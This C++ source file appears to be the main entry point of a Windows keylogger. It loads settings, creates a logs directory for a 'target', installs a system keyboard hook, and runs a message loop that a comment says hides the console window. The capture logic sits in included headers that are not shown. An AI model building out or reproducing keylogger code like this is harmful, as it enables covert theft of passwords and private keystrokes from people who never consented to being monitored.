#include <windows.h>
#include <fstream>
#include "src/KeyboardHook.h"
#include "src/IO.h"
#include "src/Settings.h"


int main()
{
    bool ok = Settings::InitSettings();
    if (!ok)
        return 0;

    IO::MakeOneDirectory(IO::GetTargetLogsDirPath(false));
    IO::WriteToLog("Starting program...");

    ok = KeyboardHook::InstallHook(); 
    
    if (!ok)
        IO::WriteDebugAppLog("Could not install keyboardhook, exiting...");
    
    //this hides the console window
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0))
    {   
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    KeyboardHook::UninstallHook();
    return 0;
}